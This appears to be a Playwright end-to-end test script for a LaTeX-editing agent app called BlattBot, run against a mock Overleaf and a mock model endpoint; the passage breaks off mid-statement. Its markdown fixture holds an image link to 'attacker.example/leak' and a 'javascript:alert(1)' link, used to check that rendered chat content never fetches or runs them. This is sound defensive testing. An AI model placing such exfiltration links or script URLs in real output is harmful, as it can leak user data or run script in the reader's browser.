/**
 * No-agent UI verification: boots the mock Overleaf + an isolated BlattBot
 * server, then drives the real browser UI through the dashboard hub
 * (add account → import project), the project view (Source, manual edit,
 * Proof, resize, Settings, inline PDF), the scope selector, and the
 * local-project lifecycle (create blank → publish to Overleaf).
 * Screenshots every stage. Costs nothing — no agent turn is involved.
 */
import { chromium } from "playwright-core";
import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir, homedir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { startMockOverleaf } from "./mock-overleaf.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const SHOTS = process.env.UI_SHOTS_DIR ?? "/tmp/blattbot-ui-shots";
const EXECUTABLE = `${process.env.HOME}/.cache/ms-playwright/chromium-1234/chrome-linux64/chrome`;
const SERVER_PORT = 4570;
const MOCK_PORT = 4571;
const ASK_PORT = 4572;
const PROJECT_ID = "0123456789abcdef01234567";
const COOKIE = "overleaf_session2=mock-session";

const MAIN_TEX = `\\documentclass{article}
\\title{BlattBot Demo Thesis}
\\author{Mock Author}
\\begin{document}
\\maketitle
\\section{Introduction}
% overview of the problem
Attention mechanisms let a model weigh context dynamically~\\cite{vaswani2017attention}.
\\newpage
\\section{Methods}
We study $f(x) = \\sigma(Wx + b)$ under standard assumptions.
\\newpage
\\section{Conclusion}
The approach compiles reliably.
\\bibliographystyle{plain}
\\bibliography{refs}
\\end{document}
`;

const REFS_BIB = `@inproceedings{vaswani2017attention,
  title     = {Attention is All You Need},
  author    = {Vaswani, Ashish and others},
  booktitle = {NeurIPS},
  year      = {2017},
}
`;

/**
 * Markdown/math payload the ask-mock appends to its answered echo so the
 * markdown pipeline (react-markdown + remark-math + KaTeX) can be asserted
 * end to end: bold, inline and display math, a fence keeping its literal $,
 * a lone currency dollar that must stay plain text — plus the hardening and
 * project-link cases: a remote image and a javascript: link that must never
 * fetch/navigate (F1), an unpaired \[ lookalike (F2), an indented code block
 * (F3), display math on a list item's continuation line (F4), and
 * file-mention links plus a locatable blockquote (job B).
 */
const MD_ECHO = [
  "Rendering check: **bold text** plus inline math $d(v)$ and $h^{(t)}(v)$.",
  "",
  "$$\\int_0^1 x\\,dx$$",
  "",
  "```",
  "code keeps its literal $x$ and **markers**",
  "```",
  "",
  "this costs $5 in total",
  "",
  "![x](https://attacker.example/leak?d=1) and a [boom](javascript:alert(1)) link.",
  "",
  "Use \\\\[4pt] for spacing.",
  "",
  "\\[x=1\\]",
  "",
  "    indented code keeps \\(x\\) raw",
  "",
  "- first bullet",
  "  $$E=mc^2$$",
  "- second bullet",
  "",
  "See `main.tex:3` and nonexistent.tex:9 for context.",
  "",
  "> Attention mechanisms let a model weigh context dynamically",
].join("\n");

/**
 * Minimal OpenAI-compatible SSE endpoint for the AskUserQuestion e2e (W9):
 * each turn's first completion request streams an ask_user tool call (turn 1
 * asks about the section, turn 2 about the abstract, so the two cards are
 * distinguishable); once the turn's tool result arrives — the request's LAST
 * message is a tool message — it streams a final text that echoes the chosen
 * answer, or the skip when the user declined. Purely local — no real
 * endpoint is ever contacted.
 */
function startAskMock(
  port: number,
): Promise<{
  close: () => Promise<void>;
  prompts: string[];
  images: { mime: string; bytes: number }[];
}> {
  /** Every user prompt the "model" received — lets checks assert what was sent. */
  const prompts: string[] = [];
  /** Every image part the "model" received (W10) — mime + decoded byte count. */
  const images: { mime: string; bytes: number }[] = [];
  const server = createServer((req, res) => {
    const chunks: Buffer[] = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      let body: any = null;
      try {
        body = JSON.parse(Buffer.concat(chunks).toString("utf8"));
      } catch {
        /* leave null */
      }
      res.writeHead(200, { "Content-Type": "text/event-stream" });
      const sse = (obj: unknown) => res.write(`data: ${JSON.stringify(obj)}\n\n`);
      const msgs: any[] = body?.messages ?? [];
      const last = msgs.at(-1);
      const userCount = msgs.filter((m: any) => m.role === "user").length;
      const lastUser = [...msgs].reverse().find((m: any) => m.role === "user");
      if (typeof lastUser?.content === "string" && !prompts.includes(lastUser.content)) {
        prompts.push(lastUser.content);
      }
      // W10: a vision-shaped user message — record the image parts and answer
      // with plain text (no question card) so the check stays deterministic.
      if (Array.isArray(lastUser?.content)) {
        let seen = 0;
        for (const part of lastUser.content) {
          if (part?.type !== "image_url" || typeof part.image_url?.url !== "string") continue;
          const m = /^data:([^;]+);base64,(.*)$/s.exec(part.image_url.url);
          if (!m) continue;
          seen++;
          images.push({ mime: m[1], bytes: Buffer.from(m[2], "base64").length });
        }
        const text = lastUser.content.find((p: any) => p?.type === "text")?.text ?? "";
        if (typeof text === "string" && !prompts.includes(text)) prompts.push(text);
        sse({ choices: [{ delta: { content: `Received ${seen} attached image(s).` } }] });
        sse({ choices: [{ delta: {}, finish_reason: "stop" }] });
        res.write("data: [DONE]\n\n");
        res.end();
        return;
      }
      // A Refs "fix" request is answered with plain text — the point of the
      // check is that the composed repair prompt reached the model at all.
      if (typeof lastUser?.content === "string" && lastUser.content.includes("citation audit flagged")) {
        sse({ choices: [{ delta: { content: "Looking into that flagged reference now." } }] });
        sse({ choices: [{ delta: {}, finish_reason: "stop" }] });
        res.write("data: [DONE]\n\n");
        res.end();
        return;
      }
      if (last?.role !== "tool") {
        const args = JSON.stringify({
          questions: [
            userCount >= 2
              ? {
                  question: "Should I also polish the abstract?",
                  header: "Abstract",
                  options: [
                    { label: "Yes, polish it", description: "Tighten the wording" },
                    { label: "No, leave it", description: "Keep it as written" },
                  ],
                  multiSelect: false,
                }
              : {
                  question: "Which section should I improve?",
                  header: "Section",
                  options: [
                    { label: "Introduction", description: "Rework the opening" },
                    { label: "Conclusion", description: "Strengthen the ending" },
                  ],
                  multiSelect: false,
                },
          ],
        });
        sse({
          choices: [
            {
              delta: {
                tool_calls: [
                  {
                    index: 0,
                    id: `call_ask_${userCount}`,
                    function: { name: "ask_user", arguments: args },
                  },
                ],
              },
            },
          ],
        });
        sse({ choices: [{ delta: {}, finish_reason: "tool_calls" }] });
      } else {
        // The turn's tool result — echo the answer, or the decline on a skip.
        let declined = false;
        let chosen = "nothing";
        try {
          const parsed = JSON.parse(last.content);
          declined = parsed?.declined === true;
          const first = Object.values(parsed?.answers ?? {})[0];
          if (typeof first === "string" && first) chosen = first;
        } catch {
          /* keep the defaults */
        }
        sse({
          choices: [
            {
              delta: {
                content: declined
                  ? "You skipped the question — proceeding with my best judgment."
                  : `Understood — I will focus on the ${chosen} as requested.\n\n${MD_ECHO}`,
              },
            },
          ],
        });
        sse({ choices: [{ delta: {}, finish_reason: "stop" }] });
      }
      res.write("data: [DONE]\n\n");
      res.end();
    });
  });
  return new Promise((resolveStart) =>
    server.listen(port, "127.0.0.1", () =>
      resolveStart({ close: () => new Promise<void>((r) => server.close(() => r())), prompts, images }),
    ),
  );
}

/**
 * A real 96×64 two-band PNG (240 bytes) — big enough that the composer
 * thumbnail and the bubble render visibly in the screenshots, small enough to
 * inline. Pasted into the composer through a synthetic DataTransfer.
 */
const PASTE_PNG_B64 =
  "iVBORw0KGgoAAAANSUhEUgAAAGAAAABACAIAAABqVuVZAAAAt0lEQVR4nO3YQQ3AIBQEUXxWRoUgowqqo5ZwQA/kZ//hJSiYzE6h43suZ0NgoLMnABBAZw1hEEAMKv3OmBhADDKx5F1fgwBikIlpUONfLiINEINMTIPSJRZpgBhkYvncuCgCxCATa3c8VgFiUO3E5ns7GwIA/fgBEEBnDWEQQAwq/QqbGEAMMrHkXV+DAGKQiWlQ418uIg0Qg0xMg9IlFmmAGGRi+dy4KALEIBNrdzxWAWLQrJzYAoofYneczCQZAAAAAElFTkSuQmCC";
const PASTE_PNG_BYTES = 240;

/** Local auth: script-side API calls carry the Bearer token from /api/bootstrap. */
let authToken = "";
const afetch = (url: string, init: RequestInit = {}) =>
  fetch(url, {
    ...init,
    headers: { ...(init.headers as Record<string, string> | undefined), Authorization: `Bearer ${authToken}` },
  });

/** Wait for the server and capture the auth token in one go. */
async function waitFor(bootstrapUrl: string, timeoutMs = 20_000): Promise<void> {
  const until = Date.now() + timeoutMs;
  while (Date.now() < until) {
    try {
      const res = await fetch(bootstrapUrl);
      if (res.ok) {
        authToken = ((await res.json()) as { token: string }).token;
        return;
      }
    } catch {
      /* not up yet */
    }
    await new Promise((r) => setTimeout(r, 250));
  }
  throw new Error(`timed out waiting for ${bootstrapUrl}`);
}

async function main() {
  mkdirSync(SHOTS, { recursive: true });

  const mock = await startMockOverleaf(MOCK_PORT, PROJECT_ID);
  mock.files.set("main.tex", Buffer.from(MAIN_TEX));
  mock.files.set("sections/refs.bib", Buffer.from(REFS_BIB));
  const askMock = await startAskMock(ASK_PORT);

  // Isolated data dir so the real registry is untouched; borrow the tectonic binary.
  const dataDir = mkdtempSync(join(tmpdir(), "blattbot-ui-verify-"));
  const realTectonic = join(homedir(), ".local", "share", "blattbot", "bin", "tectonic");
  mkdirSync(join(dataDir, "bin"), { recursive: true });
  if (existsSync(realTectonic)) symlinkSync(realTectonic, join(dataDir, "bin", "tectonic"));

  const server = spawn("npx", ["tsx", "src/index.ts"], {
    cwd: join(__dirname, ".."),
    env: { ...process.env, BLATTBOT_PORT: String(SERVER_PORT), BLATTBOT_DATA_DIR: dataDir },
    stdio: "inherit",
  });

  let browser;
  let downloads = 0;
  try {
    await waitFor(`http://127.0.0.1:${SERVER_PORT}/api/bootstrap`);

    browser = await chromium.launch({ executablePath: EXECUTABLE, headless: true });
    const page = await browser.newPage({ viewport: { width: 1500, height: 920 } });
    page.on("download", () => downloads++);
    // F1 regression net: rendering untrusted chat content must never issue a
    // request to the attacker host embedded in MD_ECHO's image markdown.
    const attackerRequests: string[] = [];
    page.on("request", (r) => {
      if (r.url().includes("attacker.example")) attackerRequests.push(r.url());
    });
    page.on("console", (msg) => {
      if (msg.type() === "error") console.log("  [console.error]", msg.text());
    });
    const shot = (name: string) => page.screenshot({ path: `${SHOTS}/${name}.png` });
    // The project view is two panes, each with its own tab strip: the left
    // <main> (chat by default) and the resizable right <aside> (proof by default).
    const aside = () => page.locator('aside[data-pane="right"]');
    const leftPane = () => page.locator('main[data-pane="left"]');

    // ---- Dashboard: add an account (paste-cookie path against the mock) ----
    await page.goto(`http://127.0.0.1:${SERVER_PORT}`, { waitUntil: "networkidle" });
    await shot("20-dashboard-empty");

    // ---- Unofficial-API notice: shown for overleaf.com (the default instance),
    // hidden once the instance points at a self-hosted/mock host.
    const unofficialNotice = page.getByText(/internal web API \(unofficial\)/);
    const unofficialNoticeShown = (await unofficialNotice.count()) > 0;
    await page.getByPlaceholder(/overleaf\.com — or a project link/).fill(`http://127.0.0.1:${MOCK_PORT}`);
    await page.waitForTimeout(200);
    const unofficialNoticeOk = unofficialNoticeShown && (await unofficialNotice.count()) === 0;
    await page.getByRole("button", { name: "paste cookie" }).click();
    await page.getByPlaceholder(/overleaf_session2/).fill(COOKIE);
    await page.getByRole("button", { name: "Use this session" }).click();

    // The account section lists the remote project with an Import action.
    const importBtn = page.getByRole("button", { name: "Import Mock Thesis" });
    await importBtn.waitFor({ timeout: 15_000 });
    const dashText = await page.locator("body").innerText();
    const accountOk = dashText.includes("mock@example.org") && dashText.includes("127.0.0.1");
    await shot("21-dashboard-account");

    // ---- Import → the row becomes openable → open the project view ----
    await importBtn.click();
    await page.getByText("connected").first().waitFor({ timeout: 30_000 });
    await shot("22-dashboard-imported");
    await page.getByRole("button", { name: "Open Mock Thesis" }).click();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    // Default layout is chat | pdf, and opening the project compiles the PDF
    // without any user action — canvases must appear on their own.
    await page.locator("canvas").first().waitFor({ state: "visible", timeout: 120_000 });
    const openCompileOk = (await page.locator("canvas").count()) >= 1;
    await page.waitForTimeout(400);
    await shot("23-project-open");

    // ---- W7 a11y: the pane strips are real tablists; the active tab is selected ----
    const tablistCount = await page.getByRole("tablist").count();
    const tablistOk =
      tablistCount >= 2 &&
      (await aside().getByRole("tab", { name: "PDF", exact: true }).getAttribute("aria-selected")) ===
        "true" &&
      (await leftPane().getByRole("tab", { name: "Chat", exact: true }).getAttribute("aria-selected")) ===
        "true";

    // The built stylesheet keeps its prefers-reduced-motion fallbacks.
    const cssHrefs = await page.evaluate(() =>
      Array.from(document.querySelectorAll('link[rel="stylesheet"]')).map(
        (l) => (l as HTMLLinkElement).href,
      ),
    );
    let builtCss = "";
    for (const href of cssHrefs) builtCss += await (await fetch(href)).text();
    const reducedMotionOk = builtCss.includes("prefers-reduced-motion");

    const apiBase = `http://127.0.0.1:${SERVER_PORT}/api`;
    const projects = (await (await afetch(`${apiBase}/projects`)).json()) as { id: string; name: string }[];
    const mockProjectId = projects.find((p) => p.name === "Mock Thesis")!.id;
    const getFile = async (path: string) =>
      ((await (await afetch(`${apiBase}/projects/${mockProjectId}/file?path=${encodeURIComponent(path)}`)).json()) as {
        content: string;
      }).content;
    const getChats = async () =>
      (await (await afetch(`${apiBase}/projects/${mockProjectId}/chats`)).json()) as {
        chats: { id: string; title: string; updatedAt: string }[];
        activeChatId: string;
      };

    // ---- Chats: opening the project created one active "New chat" ----
    const chats1 = await getChats();
    const chatInitOk =
      chats1.chats.length === 1 &&
      chats1.chats[0].title === "New chat" &&
      chats1.activeChatId === chats1.chats[0].id;
    const chatHeader = page.getByTitle("Switch chat");
    const chatHeaderOk = (await chatHeader.innerText()).includes("New chat");

    // ---- "+ new chat" creates a second chat and switches to it ----
    await chatHeader.click();
    await page.getByRole("button", { name: "+ new chat" }).click();
    await page.waitForTimeout(500);
    const chats2 = await getChats();
    const newChatOk = chats2.chats.length === 2 && chats2.activeChatId !== chats1.activeChatId;
    await shot("23b-chat-new");

    // ---- Model chip: shows the resolved default, popover saves another model ----
    const modelChip = page.getByRole("button", { name: "Agent model" });
    const modelChipText = await modelChip.innerText(); // expected "sonnet-5"
    await modelChip.click();
    await page.getByRole("button", { name: "claude-opus-5", exact: true }).waitFor({ timeout: 5_000 });
    await shot("23c-model-popover");
    await page.getByRole("button", { name: "claude-opus-5", exact: true }).click();
    await page.waitForTimeout(500);
    const settingsAfterPick = (await (await afetch(`${apiBase}/settings`)).json()) as {
      model: string;
      resolvedModel: string;
    };
    const modelSavedOk =
      settingsAfterPick.model === "claude-opus-5" && settingsAfterPick.resolvedModel === "claude-opus-5";
    const modelChipUpdated = (await modelChip.innerText()) === "opus-5";
    // Reset to the default so the rest of the flow (and Settings) sees a clean slate.
    await afetch(`${apiBase}/settings`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ model: "" }),
    });
    const settingsReset = (await (await afetch(`${apiBase}/settings`)).json()) as {
      model: string;
      resolvedModel: string;
    };
    const modelResetOk = settingsReset.model === "" && settingsReset.resolvedModel === "claude-sonnet-5";

    // ---- Per-project settings: style line, model override (alias), default mode ----
    await page.getByRole("button", { name: "Open project settings" }).click();
    const projDlg = page.getByRole("dialog", { name: "Project settings" });
    await projDlg.waitFor({ timeout: 5_000 });
    const styleBox = projDlg.getByPlaceholder(/British English/);
    await styleBox.waitFor({ timeout: 5_000 }); // the form renders after the async GET
    await styleBox.fill("Use British English. Prefer \\autoref.");
    await projDlg.getByPlaceholder("global default").fill("fable");
    await projDlg.locator("select").selectOption("research");
    await shot("23f-project-settings");
    await projDlg.getByRole("button", { name: "Save project settings" }).click();
    await projDlg.getByText("Saved.").waitFor({ timeout: 5_000 });
    const projSettingsUrl = `${apiBase}/projects/${mockProjectId}/settings`;
    const projGet = async () =>
      (await (await afetch(projSettingsUrl)).json()) as {
        styleAppend?: string;
        model?: string;
        defaultMode?: string;
        resolvedModel: string;
      };
    const projSettings1 = await projGet();
    const projSettingsSavedOk =
      projSettings1.styleAppend === "Use British English. Prefer \\autoref." &&
      projSettings1.model === "fable" &&
      projSettings1.defaultMode === "research" &&
      projSettings1.resolvedModel === "claude-fable-5";
    await projDlg.getByRole("button", { name: "Close project settings" }).click();
    await projDlg.waitFor({ state: "detached", timeout: 5_000 });

    // The chip shows the project override (alias resolved), not the global default…
    const projChipOverrideOk = (await modelChip.innerText()) === "fable-5";
    // …and the saved default mode preselects the Research pill (no manual pick stored).
    await page
      .waitForFunction(
        () => {
          const pill = [...document.querySelectorAll("button")].find(
            (b) => b.textContent === "Research" && b.className.includes("rounded-full"),
          );
          return Boolean(pill && pill.className.includes("bg-leaf/10"));
        },
        { timeout: 5_000 },
      )
      .catch(() => {});
    const projDefaultModeApplied = await page
      .getByRole("button", { name: "Research", exact: true })
      .evaluate((el) => el.className.includes("bg-leaf/10"));
    // The composer's mode picker offers the read-only Understand mode.
    const understandPillOk =
      (await page
        .getByRole("button", { name: "Understand", exact: true })
        .filter({ visible: true })
        .count()) === 1;
    await shot("23g-project-override-chip");

    // Clear the override from the chip popover; style + default mode must survive.
    await modelChip.click();
    await page.getByText("project · fable").waitFor({ timeout: 5_000 });
    await shot("23h-model-popover-project");
    await page.getByRole("button", { name: "clear project override" }).click();
    await page
      .waitForFunction(
        () => {
          const chip = [...document.querySelectorAll("button")].find(
            (b) => b.getAttribute("aria-label") === "Agent model",
          );
          return chip?.textContent?.trim() === "sonnet-5";
        },
        { timeout: 5_000 },
      )
      .catch(() => {});
    const projSettings2 = await projGet();
    const projClearOk =
      !projSettings2.model &&
      projSettings2.styleAppend === "Use British English. Prefer \\autoref." &&
      projSettings2.defaultMode === "research" &&
      projSettings2.resolvedModel === "claude-sonnet-5" &&
      (await modelChip.innerText()) === "sonnet-5";

    // ---- Persisted transcripts: write events straight through chats.ts into the
    // temp data dir (no agent turn), reload, and the chat view restores them.
    // config.ts reads the env at import time — set it before the dynamic import.
    process.env.BLATTBOT_DATA_DIR = dataDir;
    const chatsMod = await import("../src/chats.js");
    const injectChatId = chats2.activeChatId;
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "user_message",
      text: "Show me the persisted transcript",
      mode: "edit",
    });
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "text_final",
      text: "Persisted reply from an earlier session. Math survives too: $a^2+b^2=c^2$.",
    });
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "tool_use",
      id: "tu-verify-1",
      name: "Edit",
      detail: "main.tex",
    });
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "tool_result",
      id: "tu-verify-1",
      isError: false,
      fileDiff:
        "diff --git a/main.tex b/main.tex\n--- a/main.tex\n+++ b/main.tex\n" +
        "@@ -1 +1 @@\n-old ui-verify line\n+new ui-verify line\n",
    });
    // A read-only tool with its persisted one-line result summary.
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "tool_use",
      id: "tu-verify-2",
      name: "Grep",
      detail: "attention",
    });
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "tool_result",
      id: "tu-verify-2",
      isError: false,
      resultHead: "main.tex:8 — Attention mechanisms (2 lines)",
    });
    chatsMod.appendEvent(mockProjectId, injectChatId, {
      type: "turn_end",
      isError: false,
      costUsd: 0.012,
      durationMs: 3456,
    });

    await page.reload();
    await page.getByRole("button", { name: "Back to dashboard" }).waitFor({ timeout: 10_000 });
    await page
      .getByText("Persisted reply from an earlier session.")
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 10_000 });
    const restoreUserOk =
      (await page.getByText("Show me the persisted transcript").filter({ visible: true }).count()) > 0;
    // The first user message became the chat's title.
    const restoreTitleOk = (await chatHeader.innerText()).includes("Show me the persisted transcript");
    // The tool chip came back with its expandable per-edit diff.
    const toolExpander = page.getByRole("button", { name: "Show change" });
    await toolExpander.waitFor({ timeout: 5_000 });
    await toolExpander.click();
    const restoreDiffOk =
      (await page.getByText("new ui-verify line").filter({ visible: true }).count()) > 0;
    const restoreTurnEndOk = (await page.getByText("turn complete").count()) > 0;
    // The restored agent bubble renders its math through KaTeX (no raw "$…$")…
    const restoreMathOk =
      (await leftPane().locator(".prose-agent .katex").filter({ visible: true }).count()) > 0 &&
      (await leftPane().getByText("$a^2+b^2=c^2$").filter({ visible: true }).count()) === 0;
    // …and the read-only tool chip shows its persisted one-line result summary.
    const restoreResultHeadOk =
      (await page
        .getByText("main.tex:8 — Attention mechanisms (2 lines)")
        .filter({ visible: true })
        .count()) > 0 &&
      (await page.getByText("Searching", { exact: true }).filter({ visible: true }).count()) > 0;
    await shot("23d-chat-restored");

    // ---- Deleting the active chat (confirm pattern) falls back to the other one ----
    await chatHeader.click();
    await page.getByRole("button", { name: "Delete Show me the persisted transcript" }).click();
    await page.getByRole("button", { name: "Really delete Show me the persisted transcript?" }).click();
    await page.waitForTimeout(500);
    const chats3 = await getChats();
    const deleteChatOk =
      chats3.chats.length === 1 &&
      chats3.activeChatId === chats1.activeChatId &&
      (await chatHeader.innerText()).includes("New chat");
    await shot("23e-chat-deleted");

    // ---- Source tab shows the actual code ----
    await aside().getByRole("tab", { name: "Source", exact: true }).click();
    await page.getByText("documentclass").first().waitFor({ timeout: 10_000 });
    await shot("24-source");
    const sourceText = await page.locator("body").innerText();
    const sourceOk = sourceText.includes("BlattBot Demo Thesis") && sourceText.includes("refs.bib");

    // Files in subdirectories load too.
    await aside().getByRole("button", { name: "refs.bib" }).click();
    try {
      // Panels stay mounted (hidden) across tabs, so scope text checks to visible elements.
      await page
        .getByText("Attention is All You Need")
        .filter({ visible: true })
        .first()
        .waitFor({ timeout: 10_000 });
    } catch (err) {
      await shot("99-failure");
      console.log("--- body text at failure ---\n", await page.locator("body").innerText());
      throw err;
    }
    await shot("24b-source-subdir");

    // ---- Search: Ctrl+F opens CodeMirror's panel, styled to the app theme ----
    await aside().locator(".cm-content").click();
    await page.keyboard.press("Control+f");
    await aside().locator(".cm-panel.cm-search").waitFor({ timeout: 5_000 });
    const searchPanelOk = (await aside().locator(".cm-panel.cm-search").count()) > 0;
    // bg-ink-2 (#191d27) from the .cm-panels rules in index.css.
    const searchPanelStyled = await aside()
      .locator(".cm-panels")
      .evaluate((el) => getComputedStyle(el).backgroundColor === "rgb(25, 29, 39)");
    await shot("24c-search-panel");
    await page.keyboard.press("Escape");
    await aside()
      .locator(".cm-panel.cm-search")
      .waitFor({ state: "detached", timeout: 5_000 });

    // ---- LaTeX autocomplete: commands, cite keys, environments ----
    // The editor is always editable — focus it and type, no Edit mode to enter.
    await aside().getByRole("button", { name: "main.tex MAIN" }).click();
    await page.getByText("documentclass").first().waitFor({ timeout: 10_000 });
    await aside().locator(".cm-content").first().click();
    await page.keyboard.press("Control+End");
    const cmText = () => aside().locator(".cm-content").first().innerText();
    const acTooltip = aside().locator(".cm-tooltip-autocomplete");

    // `\sec` pops the command list with \section selected; accepting inserts
    // the snippet and leaves the cursor inside the braces.
    await page.keyboard.type("\\sec", { delay: 50 });
    await acTooltip.locator("li[aria-selected]", { hasText: "\\section" }).waitFor({ timeout: 5_000 });
    const acListsSection =
      (await acTooltip.locator("li .cm-completionLabel", { hasText: "\\section" }).count()) > 0;
    await shot("24c1-autocomplete-commands");
    await page.keyboard.press("Enter");
    await page.keyboard.type("Intro", { delay: 20 });
    const acSectionInserted = (await cmText()).includes("\\section{Intro}");
    // Snippet-field Tab must beat indentWithTab: it exits past the brace.
    await page.keyboard.press("Tab");
    await page.keyboard.type("x");
    const acTabExit = (await cmText()).includes("\\section{Intro}x");

    // `\cite{` offers the project's bib keys with title + year as detail.
    await page.keyboard.press("Enter");
    await page.keyboard.type("\\cite{", { delay: 50 });
    const citeItem = acTooltip.locator("li[aria-selected]", { hasText: "vaswani2017attention" });
    await citeItem.waitFor({ timeout: 5_000 });
    const acCiteDetail = (await citeItem.innerText()).includes("Attention is All You Need");
    await shot("24c2-autocomplete-cite");
    await page.keyboard.press("Enter");
    const acCiteInserted = (await cmText()).includes("\\cite{vaswani2017attention}");

    // `\begin{itemi` completes to a paired \begin{itemize}…\end{itemize},
    // consuming the auto-closed brace.
    await page.keyboard.press("End");
    await page.keyboard.press("Enter");
    await page.keyboard.type("\\begin{itemi", { delay: 50 });
    await acTooltip.locator("li[aria-selected]", { hasText: "itemize" }).waitFor({ timeout: 5_000 });
    await shot("24c3-autocomplete-env");
    await page.keyboard.press("Enter");
    const envText = await cmText();
    const acEnvPaired =
      envText.includes("\\begin{itemize}") &&
      envText.includes("\\end{itemize}") &&
      !envText.includes("\\end{itemize}}");

    // Hand-typed \begin{…} (no completion involved) + Enter auto-inserts the
    // matching \end with the cursor between; `$` auto-pairs for inline math.
    await page.keyboard.press("Control+End");
    await page.keyboard.press("Enter");
    await page.keyboard.type("\\begin{myenvzz}", { delay: 30 });
    await page.waitForTimeout(200);
    await page.keyboard.press("Enter");
    await page.keyboard.type("inside ", { delay: 20 });
    await page.keyboard.type("$ab", { delay: 30 });
    const closeText = await cmText();
    const acEnvEnterClose =
      closeText.includes("inside") &&
      closeText.indexOf("\\end{myenvzz}") > closeText.indexOf("inside");
    const acDollarPaired = closeText.includes("$ab$");
    await shot("24c4-autocomplete-result");

    // Revert (through the confirm dialog) so every later step sees the
    // untouched file state; the Revert button only exists while dirty.
    await aside().getByRole("button", { name: "Revert", exact: true }).click();
    const discardDlg1 = page.getByRole("dialog", { name: "Discard unsaved changes?" });
    await discardDlg1.waitFor({ timeout: 5_000 });
    await discardDlg1.getByRole("button", { name: "Discard changes" }).click();
    await discardDlg1.waitFor({ state: "detached", timeout: 5_000 });
    await aside()
      .locator("span.text-gold", { hasText: "●" })
      .waitFor({ state: "detached", timeout: 10_000 });
    const acUndone =
      (await aside().getByRole("button", { name: "Revert", exact: true }).count()) === 0 &&
      !(await cmText()).includes("\\section{Intro}") &&
      (await getFile("main.tex")) === MAIN_TEX;

    // ---- Manual edit: tweak main.tex, save, and the change lands in the Proof diff ----
    await aside().getByRole("button", { name: "main.tex MAIN" }).click();
    await page.getByText("documentclass").first().waitFor({ timeout: 10_000 });
    // Focus the always-editable editor and type the tweak onto the last
    // (empty) line so the doc becomes MAIN_TEX + the comment line.
    await aside().locator(".cm-content").first().click();
    await page.keyboard.press("Control+End");
    await page.keyboard.type("% manual tweak from ui-verify");
    await page.keyboard.press("Enter");
    // The custom LaTeX parser highlights command tokens in gold (#cfa75b)
    // via the HighlightStyle.
    const cmGoldTokens = await aside()
      .locator(".cm-editor .cm-line span")
      .evaluateAll((els) => els.filter((el) => getComputedStyle(el).color === "rgb(207, 167, 91)").length);
    // …and renders a genuinely multi-color document: beyond prose (paper-dim)
    // and punctuation/comments (graphite), at least three distinct hues must
    // appear — the seeded main.tex has sectioning (terracotta), math (sage),
    // a \cite key (slate blue), and gold commands.
    const cmHighlightColors = await aside()
      .locator(".cm-editor .cm-line span")
      .evaluateAll((els) => {
        const base = new Set(["rgb(185, 182, 171)", "rgb(125, 130, 148)"]); // paper-dim, graphite
        const colors = new Set<string>();
        for (const el of els) {
          const c = getComputedStyle(el).color;
          if (!base.has(c)) colors.add(c);
        }
        return [...colors].sort();
      });
    const editorTextOk =
      (await aside().getByText("manual tweak from ui-verify").filter({ visible: true }).count()) > 0;
    // The unsaved draft shows the gold dirty dot in the header.
    const dirtyDotOk = (await aside().locator("span.text-gold", { hasText: "●" }).count()) > 0;
    await shot("24d-edit-codemirror");
    // (The busy read-only swap — amber "read-only while the agent works"
    // hint + readOnly editor — is NOT covered here: `busy` only flips during
    // a real agent turn, which this script must never trigger.)
    // Save with the editor's Ctrl+S binding — a QUICK save: the dirty dot
    // clears and the editor stays editable (IDE semantics).
    await page.keyboard.press("Control+s");
    await aside()
      .locator("span.text-gold", { hasText: "●" })
      .waitFor({ state: "detached", timeout: 10_000 });
    // Still editable after the save: one more keystroke re-dirties the doc…
    await page.keyboard.type("x");
    await aside().locator("span.text-gold", { hasText: "●" }).waitFor({ timeout: 5_000 });
    const quickSaveKeepsEditor =
      (await aside().locator("span.text-gold", { hasText: "●" }).count()) > 0;
    // …and Revert (confirm dialog) drops the stray char, back to the saved tweak.
    await aside().getByRole("button", { name: "Revert", exact: true }).click();
    const discardDlg2 = page.getByRole("dialog", { name: "Discard unsaved changes?" });
    await discardDlg2.waitFor({ timeout: 5_000 });
    await discardDlg2.getByRole("button", { name: "Discard changes" }).click();
    await discardDlg2.waitFor({ state: "detached", timeout: 5_000 });
    await aside()
      .locator("span.text-gold", { hasText: "●" })
      .waitFor({ state: "detached", timeout: 10_000 });
    await aside().getByRole("tab", { name: "Proof", exact: false }).click();
    await page
      .getByText("manual tweak from ui-verify")
      .filter({ visible: true })
      .first()
      .waitFor({ timeout: 10_000 });
    await shot("25-proof-manual-edit");

    // ---- Leave warning: with the manual tweak still unapproved, the tab-close
    // guard is armed (a synthetic beforeunload comes back defaultPrevented)…
    await page
      .waitForFunction(
        () => {
          const ev = new Event("beforeunload", { cancelable: true });
          window.dispatchEvent(ev);
          return ev.defaultPrevented;
        },
        { timeout: 5_000 },
      )
      .catch(() => {});
    const leaveUnloadArmedOk = await page.evaluate(() => {
      const ev = new Event("beforeunload", { cancelable: true });
      window.dispatchEvent(ev);
      return ev.defaultPrevented;
    });

    // …and navigating away (the wordmark) opens the in-app confirm naming the
    // project and the pending file count.
    await page.getByRole("button", { name: "Back to the project dashboard" }).click();
    const leaveDlg = page.getByRole("dialog", { name: "Unapproved changes" });
    await leaveDlg.waitFor({ timeout: 5_000 });
    const leaveWarnShownOk =
      (await leaveDlg.getByText(/1 file has changes/).count()) > 0 &&
      (await leaveDlg.getByText(/Mock Thesis/).count()) > 0 &&
      (await leaveDlg.getByText(/reach Overleaf/).count()) > 0;
    await shot("25a1-leave-warning");
    // Stay: the dialog closes and the project view (with its proof) remains.
    await leaveDlg.getByRole("button", { name: "Stay" }).click();
    await leaveDlg.waitFor({ state: "detached", timeout: 5_000 });
    const leaveWarnStayOk =
